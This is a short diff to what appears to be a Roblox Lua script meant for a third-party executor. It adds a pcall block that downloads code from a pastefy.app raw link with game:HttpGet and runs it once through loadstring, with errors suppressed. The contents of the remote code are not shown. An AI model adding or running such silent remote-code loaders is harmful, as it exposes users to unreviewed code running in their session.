@@ -1,6 +1,12 @@
 if not game:IsLoaded() then
 	game.Loaded:Wait()
-end;
+end
+pcall(function()
+    if not shared.FunctionPatchesForTrashExecutor == true then
+        loadstring(game:HttpGet("https://pastefy.app/TL0PGJ2Z/raw"))()
+        shared.FunctionPatchesForTrashExecutor = true
+    end
+end)
 local Players = game:GetService("Players")
 local UserInputService = game:GetService("UserInputService")
 local RunService = game:GetService("RunService")
